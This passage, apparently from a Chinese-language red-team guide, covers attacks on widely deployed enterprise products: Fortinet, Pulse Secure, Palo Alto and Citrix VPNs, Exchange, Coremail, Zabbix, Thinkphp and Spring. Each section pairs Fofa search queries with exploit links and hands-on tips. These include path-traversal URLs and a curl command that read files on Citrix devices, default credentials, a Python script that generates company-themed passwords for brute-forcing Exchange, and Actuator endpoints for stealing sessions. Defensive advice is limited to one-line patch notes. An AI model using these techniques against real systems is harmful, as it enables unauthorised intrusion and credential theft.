<pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xxxxxxxx:<span class="hljs-number">10443</span><span class="hljs-regexp">/remote/</span>fgt_lang?lang=<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/bin/</span>sslvpnd</code></pre>

<p>后来发现这个字符串在js里面也有, 直接从前台分析也可以获得</p>
<pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xxxxx:<span class="hljs-number">10443</span><span class="hljs-regexp">/sslvpn/</span>js<span class="hljs-regexp">/login.js?q=5f9a6877fd1f78da768239aae6e739c2</span></code></pre>

<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.升级到最新版</p>
<h2 id="Pulse-Secure-SSL-VPN远程代码执行漏洞"><a href="#Pulse-Secure-SSL-VPN远程代码执行漏洞" class="headerlink" title="Pulse Secure SSL VPN远程代码执行漏洞"></a>Pulse Secure SSL VPN远程代码执行漏洞</h2><p><strong>1. 漏洞简介</strong></p>
<p>Pulse Secure SSL VPN 在全球用户量巨大, 去年橘子哥发现了很多漏洞</p>
<p><strong>2. 影响组件</strong></p>
<p>Pulse Secure SSL VPN</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs ebnf"><span class="hljs-attribute">Pulse Secure SSL VPN</span></code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"PulseSecure-SSL-VPN"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>Pulse Secure SSL VPN远程代码执行漏洞利用与分析 – 安全客, 安全资讯平台<br><a href="https://www.anquanke.com/post/id/185773" target="_blank" rel="noopener">https://www.anquanke.com/post/id/185773</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>projectzeroindia/CVE-2019-11510: Exploit for Arbitrary File Read on Pulse Secure SSL VPN (CVE-2019-11510)<br><a href="https://github.com/projectzeroindia/CVE-2019-11510" target="_blank" rel="noopener">https://github.com/projectzeroindia/CVE-2019-11510</a></p>
<p>0xDezzy/CVE-2019-11539: Exploit for the Post-Auth RCE vulnerability in Pulse Secure Connect<br><a href="https://github.com/0xDezzy/CVE-2019-11539" target="_blank" rel="noopener">https://github.com/0xDezzy/CVE-2019-11539</a></p>
<p><strong>7. 利用技巧</strong></p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.升级到最新版</p>
<h2 id="Palo-Alto-GlobalProtect-VPN远程代码执行漏洞"><a href="#Palo-Alto-GlobalProtect-VPN远程代码执行漏洞" class="headerlink" title="Palo Alto GlobalProtect VPN远程代码执行漏洞"></a>Palo Alto GlobalProtect VPN远程代码执行漏洞</h2><p><strong>1. 漏洞简介</strong></p>
<p>Palo Alto GlobalProtect 在全球用户量巨大, 去年橘子哥发现了很多漏洞</p>
<p><strong>2. 影响组件</strong><br>Palo Alto GlobalProtect</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs arcade">GlobalProtect <span class="hljs-built_in">Portal</span></code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"PaloAlto-GlobalProtect"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>Orange: Attacking SSL VPN – Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!<br><a href="https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html" target="_blank" rel="noopener">https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html</a></p>
<p>Palo Alto GlobalProtect上的PreAuth RCE – 渗透测试中心 – 博客园<br><a href="https://www.cnblogs.com/backlion/p/11209054.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/11209054.html</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>securifera/CVE-2019-1579<br><a href="https://github.com/securifera/CVE-2019-1579" target="_blank" rel="noopener">https://github.com/securifera/CVE-2019-1579</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.这个扫描的话可以判断</p>
<pre><code class="hljs awk"><span class="hljs-regexp">/global-protect/</span>portal<span class="hljs-regexp">/css/</span>login.css`
`<span class="hljs-regexp">/images/</span>logo_pan_158.gif</code></pre>

<p><code>Last-Modified</code> 是否早于于2018年</p>
<pre><code class="hljs angelscript">curl -s -I https:<span class="hljs-comment">//sslvpn/global-protect/portal/css/login.css | grep Last-Modified</span>
Last-Modified: Sun, <span class="hljs-number">10</span> Sep <span class="hljs-number">2017</span> <span class="hljs-number">16</span>:<span class="hljs-number">48</span>:<span class="hljs-number">23</span> GMT</code></pre>

<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.升级到最新版</p>
<h2 id="Citrix-Gateway-ADC-远程代码执行漏洞-CVE-2019-19781"><a href="#Citrix-Gateway-ADC-远程代码执行漏洞-CVE-2019-19781" class="headerlink" title="Citrix Gateway/ADC 远程代码执行漏洞 (CVE-2019-19781)"></a>Citrix Gateway/ADC 远程代码执行漏洞 (CVE-2019-19781)</h2><p><strong>1. 漏洞简介</strong></p>
<p>Citrix Gateway/ADC 在全球拥有很多的大客户. 这也是个很经典的灯下黑漏洞(后门)</p>
<p><strong>2. 影响组件</strong></p>
<p>Citrix Gateway/ADC</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs avrasm">Citrix Gateway/<span class="hljs-keyword">ADC</span></code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Citrix-Netscaler"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>Citrix Gateway/ADC 远程代码执行漏洞分析 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/news/232752.html" target="_blank" rel="noopener">https://www.freebuf.com/news/232752.html</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>trustedsec/cve-2019-19781: This is a tool published for the Citrix ADC (NetScaler) vulnerability. We are only disclosing this due to others publishing the exploit code first.<br><a href="https://github.com/trustedsec/cve-2019-19781" target="_blank" rel="noopener">https://github.com/trustedsec/cve-2019-19781</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.通过以下命令可以快速断定</p>
<pre><code class="hljs crystal">curl <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/host/vpn</span><span class="hljs-regexp">/../vpns</span><span class="hljs-regexp">/cfg/smb</span>.conf --path-<span class="hljs-keyword">as</span>-is --insecure</code></pre>

<p>这里部分版本不需要进行<code>../</code>跳转也可以, 具体原因没有分析</p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.升级到最新版</p>
<p>3.暂时屏蔽未授权用户对/vpns/路径的访问</p>
<h2 id="齐治堡垒机相关漏洞"><a href="#齐治堡垒机相关漏洞" class="headerlink" title="齐治堡垒机相关漏洞"></a>齐治堡垒机相关漏洞</h2><p><strong>1. 漏洞简介</strong></p>
<p>齐治堡垒机是国内使用比较多的堡垒机产品, 后端使用PHP编写</p>
<p><strong>2. 影响组件</strong><br>齐治堡垒机</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs ebnf"><span class="hljs-attribute">shterm</span></code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"shterm-堡垒机"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>审计某系统从解密到GetShell – 云+社区 – 腾讯云<br><a href="https://cloud.tencent.com/developer/article/1448700" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1448700</a></p>
<p>齐治堡垒机远程命令执行漏洞（CNVD-2019-20835）分析 – 开发笔记<br><a href="http://kfbiji.com/article/65b98114903248eb" target="_blank" rel="noopener">http://kfbiji.com/article/65b98114903248eb</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>齐治堡垒机远程命令执行漏洞（CNVD-2019-20835）分析 – 开发笔记<br><a href="http://kfbiji.com/article/65b98114903248eb" target="_blank" rel="noopener">http://kfbiji.com/article/65b98114903248eb</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.齐治堡垒机默认口令:<code>shterm/shterm</code></p>
<p>2.普通用户获取堡垒机权限, 登录之后可尝试命令注入</p>
<p>如果有类似chrome的应用可以直接使用<code>ctrl+o</code>打开窗口, 然后新建bat, 起一个cmd或者其他的程序</p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.升级到最新版</p>
<p>3.做好权限控制</p>
<h2 id="Exchange-相关漏洞"><a href="#Exchange-相关漏洞" class="headerlink" title="Exchange 相关漏洞"></a>Exchange 相关漏洞</h2><p><strong>1. 漏洞简介</strong></p>
<p>Exchange 是企业用量很大的邮件服务器, 包括一个登录后用户伪造(CVE-2018-8581, 利用难度高)和登录后反序列化漏洞(CVE-2020-0688, 利用难度低)</p>
<p><strong>2. 影响组件</strong><br>Exchange</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs ebnf"><span class="hljs-attribute">Exchange</span>
<span class="hljs-attribute">outlook</span></code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Microsoft-Exchange"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>微软Exchange爆出0day漏洞, 来看POC和技术细节 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/vuls/195162.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/195162.html</a></p>
<p>Microsoft Exchange 任意用户伪造漏洞（CVE-2018-8581）分析<br><a href="https://paper.seebug.org/804/" target="_blank" rel="noopener">https://paper.seebug.org/804/</a></p>
<p>微软Exchange服务器远程代码执行漏洞复现分析[CVE-2020-0688] – 先知社区<br><a href="https://xz.aliyun.com/t/7299" target="_blank" rel="noopener">https://xz.aliyun.com/t/7299</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>Ridter/Exchange2domain: CVE-2018-8581<br><a href="https://github.com/Ridter/Exchange2domain" target="_blank" rel="noopener">https://github.com/Ridter/Exchange2domain</a></p>
<p>Ridter/cve-2020-0688: cve-2020-0688<br><a href="https://github.com/Ridter/cve-2020-0688" target="_blank" rel="noopener">https://github.com/Ridter/cve-2020-0688</a></p>
<p>pwntester/ysoserial.net: Deserialization payload generator for a variety of .NET formatters<br><a href="https://github.com/pwntester/ysoserial.net" target="_blank" rel="noopener">https://github.com/pwntester/ysoserial.net</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.寻找企业的Exchange有个技巧</p>
<p>除了访问以下域名或者直接查找 <code>DNS MX</code> 记录</p>
<pre><code class="hljs css"><span class="hljs-selector-tag">mail</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span>
<span class="hljs-selector-tag">mail1</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span>
<span class="hljs-selector-tag">mail-hk</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span>
<span class="hljs-selector-tag">owa</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span>
<span class="hljs-selector-tag">exchange</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span>
<span class="hljs-selector-tag">email</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span>
<span class="hljs-selector-tag">outlook</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span></code></pre>

<p>还有个很好用的域名, 这是outlook的自动发现域名</p>
<pre><code class="hljs css"><span class="hljs-selector-tag">autodiscover</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span></code></pre>

<p>2.爆破Exchange</p>
<p>这里两个漏洞都需要登录, 其实这个的弱口令不是很难找, 经常会成为企业的突破口</p>
<p>通常这里的密码能横穿内网, 比如 VPN, OA, SSO</p>
<p><code>Exchange</code>通常有以下几个接口</p>
<p><code>/owa</code> 前台web登录, 一般可以爆破</p>
<p><code>/ews</code> 这里是ews的接口, 可以进行401认证爆破, 只需要(域)账号和密码, 不需要知道域名前缀, 更方便爆破</p>
<p><code>/autodiscover/autodiscover.xml</code> 自动发现接口, 同ews爆破</p>
<p>3.爆破工具可使用 <code>owa</code>用<code>burp</code>, <code>ews</code>用<code>ruler</code>, <code>awvs</code>(比较好用)</p>
<p>sensepost/ruler: A tool to abuse Exchange services<br><a href="https://github.com/sensepost/ruler" target="_blank" rel="noopener">https://github.com/sensepost/ruler</a></p>
<p>4.弱口令爆破技巧, 爆破<code>Exchange</code>相对比较好用, 直接生成企业特色弱口令</p>
<pre><code class="hljs routeros">import itertools
prefix = [<span class="hljs-string">'baidu'</span>, <span class="hljs-string">'Baidu'</span>]
<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-string">''</span>.join(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> list(itertools.product(prefix, [<span class="hljs-string">'@'</span>, <span class="hljs-string">''</span>], [<span class="hljs-string">'2019'</span>, <span class="hljs-string">'2020'</span>, <span class="hljs-string">'2018'</span>, <span class="hljs-string">'123'</span>, <span class="hljs-string">'1234'</span>, <span class="hljs-string">'123456'</span>], [<span class="hljs-string">'!'</span>, <span class="hljs-string">''</span>, <span class="hljs-string">'.'</span>]))] : <span class="hljs-builtin-name">print</span>(x)

baidu@2019!
baidu@2019
baidu@2019.
baidu@2020!
baidu@2020
<span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span>.
Baidu123456
Baidu123456.</code></pre>

<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.升级到最新版</p>
<p>3.做好权限控制</p>
<h2 id="Coremail-相关漏洞"><a href="#Coremail-相关漏洞" class="headerlink" title="Coremail 相关漏洞"></a>Coremail 相关漏洞</h2><p><strong>1. 漏洞简介</strong></p>
<p>Coremail 是国内使用量很大的邮件服务商, 包括网易邮箱的后端使用的也是coremail</p>
<p><strong>2. 影响组件</strong><br>Coremail</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs ebnf"><span class="hljs-attribute">Coremail</span></code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Coremail"</span></code></pre>

<p><strong>5. 漏洞分析</strong><br>Coremail-0day敏感文件泄露漏洞送附批量检测脚本_数据库_god_Zeo的博客-CSDN博客<br><a href="https://blog.csdn.net/god_zzZ/article/details/92735189" target="_blank" rel="noopener">https://blog.csdn.net/god_zzZ/article/details/92735189</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>yuxiaoyou123/coremail-exp<br><a href="https://github.com/yuxiaoyou123/coremail-exp" target="_blank" rel="noopener">https://github.com/yuxiaoyou123/coremail-exp</a></p>
<p>dpu/coremail-address-book: Coremail邮件系统组织通讯录导出脚本<br><a href="https://github.com/dpu/coremail-address-book" target="_blank" rel="noopener">https://github.com/dpu/coremail-address-book</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.这个找不到源码, 没法分析</p>
<p>里面的密码也多半没啥用, 还不如邮件里搜索一下vpn/密码</p>
<p>2.这个东西有几率受到ImageMagick影响(此处存疑, 我只在dnslog见过, 没有实锤)</p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.升级到最新版</p>
<h2 id="Winmail-相关漏洞"><a href="#Winmail-相关漏洞" class="headerlink" title="Winmail 相关漏洞"></a>Winmail 相关漏洞</h2><p><strong>1. 漏洞简介</strong></p>
<p>Winmail 是国内使用量较大的邮件服务商, 由于版本老旧, 有一些历史漏洞, 注入, 任意文件下载, 上传</p>
<p><strong>2. 影响组件</strong><br>Winmail</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs ebnf"><span class="hljs-attribute">Winmail</span></code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Winmail-Server"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>Winmail最新直达webshell 0day漏洞挖掘实录_91Ri.org<br><a href="http://www.91ri.org/16519.html" target="_blank" rel="noopener">http://www.91ri.org/16519.html</a></p>
<p>winmail过滤不严getshell+任意文件下载(需要登录邮箱）_黑客技术<br><a href="http://www.hackdig.com/06/hack-36899.htm" target="_blank" rel="noopener">http://www.hackdig.com/06/hack-36899.htm</a></p>
<p>Winmail普通用户可直接进入后台取得域名管理、用户管理等所有权限 | WooYun-2014-57890 | WooYun.org<br><a href="https://php.mengsec.com/bugs/wooyun-2014-057890.html" target="_blank" rel="noopener">https://php.mengsec.com/bugs/wooyun-2014-057890.html</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>Winmail最新直达webshell 0day漏洞挖掘实录_91Ri.org<br><a href="http://www.91ri.org/16519.html" target="_blank" rel="noopener">http://www.91ri.org/16519.html</a></p>
<p>winmail过滤不严getshell+任意文件下载(需要登录邮箱）_黑客技术<br><a href="http://www.hackdig.com/06/hack-36899.htm" target="_blank" rel="noopener">http://www.hackdig.com/06/hack-36899.htm</a></p>
<p>Winmail普通用户可直接进入后台取得域名管理、用户管理等所有权限 | WooYun-2014-57890 | WooYun.org<br><a href="https://php.mengsec.com/bugs/wooyun-2014-057890.html" target="_blank" rel="noopener">https://php.mengsec.com/bugs/wooyun-2014-057890.html</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.这个邮箱很多高校在用, 通过分析补丁, 一些老版本没升级的话还是有问题, 最新版是6.5</p>
<p>2.邮件系列老洞</p>
<p>高屋建瓴之WebMail攻与防 – cyjay5un – 博客园<br><a href="https://www.cnblogs.com/cyjaysun/p/4378907.html" target="_blank" rel="noopener">https://www.cnblogs.com/cyjaysun/p/4378907.html</a></p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.升级到最新版</p>
<h2 id="Zabbix-相关漏洞"><a href="#Zabbix-相关漏洞" class="headerlink" title="Zabbix 相关漏洞"></a>Zabbix 相关漏洞</h2><p><strong>1. 漏洞简介</strong></p>
<p>Zabbix 由于监控着内网众多主机, 所以也是内网关注的重点, 主要是注入/弱口令/命令执行</p>
<p><strong>2. 影响组件</strong></p>
<p>Zabbix</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs ebnf"><span class="hljs-attribute">Zabbix</span></code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Zabbix"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>记一次zabbix安装及漏洞利用getshell全过程 – 先知社区<br><a href="https://xz.aliyun.com/t/6874" target="_blank" rel="noopener">https://xz.aliyun.com/t/6874</a></p>
<p>Zabbix 最新 SQL 注入漏洞及 EXP – Jamin Zhang<br><a href="https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/" target="_blank" rel="noopener">https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>记一次zabbix安装及漏洞利用getshell全过程 – 先知社区<br><a href="https://xz.aliyun.com/t/6874" target="_blank" rel="noopener">https://xz.aliyun.com/t/6874</a></p>
<p>Zabbix 最新 SQL 注入漏洞及 EXP – Jamin Zhang<br><a href="https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/" target="_blank" rel="noopener">https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.这里如果 Zabbix 附近遇到 Grafana, 一般都是默认口令 admin/admin, 进后台查看数据源的位置, 如果有 Zabbix , 直接 f12 查看密码, 就可以登录 Zabbix 了</p>
<p>2.另外 Grafana 后台sql查询处可以执行任意 sql, 其他数据源也一样见机行事</p>
<p><strong>8. 防护方法</strong></p>
<p>1.设置强口令</p>
<p>2.尽量不要开放到公网</p>
<p>3.限制来源IP</p>
<p>4.升级到最新版</p>
<h2 id="边界产品-防火墙-网关-路由器-VPN-相关漏洞"><a href="#边界产品-防火墙-网关-路由器-VPN-相关漏洞" class="headerlink" title="边界产品(防火墙, 网关, 路由器, VPN) 相关漏洞"></a>边界产品(防火墙, 网关, 路由器, VPN) 相关漏洞</h2><p><strong>1. 漏洞简介</strong></p>
<p>大型企业往往会配置一些边界设备来维护企业内外网通信, 这里也存在灯下黑的问题, 由于多数不开源, 漏洞主要以弱口令为主</p>
<p><strong>2. 影响组件</strong></p>
<p>防火墙, 网关, 路由器, VPN</p>
<p><strong>3. 漏洞指纹</strong></p>
<p>防火墙, 网关, 路由器, VPN</p>
<p><strong>4. Fofa Dork</strong><br>防火墙, 网关, 路由器, VPN 的名称</p>
<p><strong>5. 漏洞分析</strong></p>
<p>【安全设备】常见网络安全设备默认口令|IT2021.Com<br><a href="https://www.it2021.com/security/614.html" target="_blank" rel="noopener">https://www.it2021.com/security/614.html</a></p>
<p>渗透测试之各厂商防火墙登录IP、初始密码、技术支持<br><a href="https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>【安全设备】常见网络安全设备默认口令|IT2021.Com<br><a href="https://www.it2021.com/security/614.html" target="_blank" rel="noopener">https://www.it2021.com/security/614.html</a></p>
<p>渗透测试之各厂商防火墙登录IP、初始密码、技术支持<br><a href="https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.这个东西好多人不改默认口令, 就算改很多也是企业特色弱口令</p>
<p><code>admin</code> <code>root</code> <code>123456</code> 永远的神</p>
<p>内网的安全平台就是个漏洞指南</p>
<p><strong>8. 防护方法</strong></p>
<p>1.设置强口令</p>
<p>2.限制来源IP</p>
<h1 id="第三节"><a href="#第三节" class="headerlink" title="第三节"></a>第三节</h1><h2 id="Thinkphp-相关漏洞"><a href="#Thinkphp-相关漏洞" class="headerlink" title="Thinkphp 相关漏洞"></a>Thinkphp 相关漏洞</h2><p><strong>1. 漏洞简介</strong></p>
<p>Thinkphp 是国内很常见的PHP框架, 存在 远程代码执行/sql注入/反序列化/日志文件泄露等问题</p>
<p><strong>2. 影响组件</strong><br>Thinkphp</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs sas">Thinkphp
<span class="hljs-meta">X</span>-Powered-<span class="hljs-meta">By</span>: ThinkPHP</code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"ThinkPHP"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>ThinkPHP漏洞总结 – 赛克社区<br><a href="http://zone.secevery.com/article/1165" target="_blank" rel="noopener">http://zone.secevery.com/article/1165</a></p>
<p>挖掘暗藏ThinkPHP中的反序列利用链 – 斗象能力中心<br><a href="https://blog.riskivy.com/挖掘暗藏thinkphp中的反序列利用链/" target="_blank" rel="noopener">https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/</a></p>
<p>ThinkPHP使用不当可能造成敏感信息泄露<em>PHP_Fly</em>鹏程万里-CSDN博客<br><a href="https://blog.csdn.net/Fly_hps/article/details/81201904" target="_blank" rel="noopener">https://blog.csdn.net/Fly_hps/article/details/81201904</a></p>
<p>DSMall代码审计 – 安全客，安全资讯平台<br><a href="https://www.anquanke.com/post/id/203461" target="_blank" rel="noopener">https://www.anquanke.com/post/id/203461</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>SkyBlueEternal/thinkphp-RCE-POC-Collection: thinkphp v5.x 远程代码执行漏洞-POC集合<br><a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection" target="_blank" rel="noopener">https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection</a></p>
<p>Dido1960/thinkphp: thinkphp反序列化漏洞复现及POC编写<br><a href="https://github.com/Dido1960/thinkphp" target="_blank" rel="noopener">https://github.com/Dido1960/thinkphp</a></p>
<p>whirlwind110/tphack: Thinkphp3/5 Log文件泄漏利用工具<br><a href="https://github.com/whirlwind110/tphack" target="_blank" rel="noopener">https://github.com/whirlwind110/tphack</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.遇到Thinkphp的站点看一下版本, 或者直接扫一下, 看看有没有rce, 或者日志文件泄露</p>
<p>2.自从我挖了thinphp的反序列化利用链以后, 这类型考题经常出没在ctf中</p>
<p>3.实战中也看到偶尔有可以利用的情况, 运气好可能有惊喜, 刚好有篇新出的文章中使用到了这个漏洞</p>
<p>DSMall代码审计 – 安全客，安全资讯平台<br><a href="https://www.anquanke.com/post/id/203461" target="_blank" rel="noopener">https://www.anquanke.com/post/id/203461</a></p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.升级到最新版Thinkphp</p>
<p>3.前置WAF进行防护</p>
<h2 id="Spring-系列漏洞"><a href="#Spring-系列漏洞" class="headerlink" title="Spring 系列漏洞"></a>Spring 系列漏洞</h2><p><strong>1. 漏洞简介</strong></p>
<p>Spring 是java web里最最最最常见的组件了, 自然也是研究的热门, 好用的漏洞主要是Spring Boot Actuators 反序列化, 火起来之前用了一两年, 效果很棒</p>
<p><strong>2. 影响组件</strong><br>Spring xxx</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs coq">X-Application-<span class="hljs-keyword">Context</span>:</code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Spring-Framework"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>Spring 框架漏洞集合 ~ Misaki’s Blog<br><a href="https://misakikata.github.io/2020/04/Spring-框架漏洞集合/" target="_blank" rel="noopener">https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/</a></p>
<p>Exploiting Spring Boot Actuators | Veracode blog<br><a href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators" target="_blank" rel="noopener">https://www.veracode.com/blog/research/exploiting-spring-boot-actuators</a></p>
<p>Spring Boot Actuators配置不当导致RCE漏洞复现 – JF ‘ blog<br>[<a href="https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/]" target="_blank" rel="noopener">https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/]</a>(<a href="https://jianfensec.com/漏洞复现/Spring" target="_blank" rel="noopener">https://jianfensec.com/漏洞复现/Spring</a> Boot Actuators配置不当导致RCE漏洞复现/)</p>
<p><strong>6. 漏洞利用</strong></p>
<p>mpgn/Spring-Boot-Actuator-Exploit: Spring Boot Actuator (jolokia) XXE/RCE<br><a href="https://github.com/mpgn/Spring-Boot-Actuator-Exploit" target="_blank" rel="noopener">https://github.com/mpgn/Spring-Boot-Actuator-Exploit</a></p>
<p>artsploit/yaml-payload: A tiny project for generating SnakeYAML deserialization payloads<br><a href="https://github.com/artsploit/yaml-payload" target="_blank" rel="noopener">https://github.com/artsploit/yaml-payload</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.Spring Boot Actuators 相关漏洞超级好用</p>
<p>很多厂商一开始都不懂, 直接对外开放<code>Spring Boot Actuators</code>, 造成了有一段时间每个用了<code>Spring Boot</code>的厂商都出了问题</p>
<p>尤其是现在很多厂商使用微服务框架, 通过网关进行路由分发, 一些子目录通常对应一个<code>Spring Boot</code>启动的服务</p>
<p>然后子目录比如 <code>http://123.123.123.123/admin/env</code> , <code>http://123.123.123.123/manager/env</code>也都是可以出现的</p>
<p><code>/env</code> 可以偷session, RCE</p>
<p><code>/heapdump</code> 可以直接dump jvm中的对象, 使用 jhat 可以读取里面的对象</p>
<p>可以遍历如下的endpoint, 1.x 2.x的目录不一样, 所以都覆盖了一下</p>
<pre><code class="hljs jboss-cli"><span class="hljs-string">/trace</span>
<span class="hljs-string">/health</span>
<span class="hljs-string">/loggers</span>
<span class="hljs-string">/metrics</span>
<span class="hljs-string">/autoconfig</span>
<span class="hljs-string">/heapdump</span>
<span class="hljs-string">/threaddump</span>
<span class="hljs-string">/env</span>
<span class="hljs-string">/info</span>
<span class="hljs-string">/dump</span>
<span class="hljs-string">/configprops</span>
<span class="hljs-string">/mappings</span>
<span class="hljs-string">/auditevents</span>
